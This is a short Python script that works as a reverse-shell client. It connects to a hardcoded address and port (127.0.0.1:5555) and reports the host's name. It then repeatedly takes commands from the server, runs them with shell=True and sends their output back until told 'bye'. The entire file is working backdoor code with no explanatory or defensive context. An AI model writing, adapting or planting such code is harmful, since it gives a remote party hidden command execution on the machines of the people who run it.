import socket
import subprocess
ip_address = '127.0.0.1'
port_number = 5555
hostname = socket.gethostname()

client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

client_socket.connect((ip_address,port_number))
client_socket.send(hostname.encode())
cmd = list(client_socket.recv(1024).decode().split(" "))
while cmd!=['bye'] and cmd!=['']:
    p =subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    output,error = p.communicate()
    msg = str(output.decode())
    client_socket.send(msg.encode())
    print(cmd)
    print('waiting for input from SRV')
    cmd = list(client_socket.recv(1024).decode().split(" "))

client_socket.close()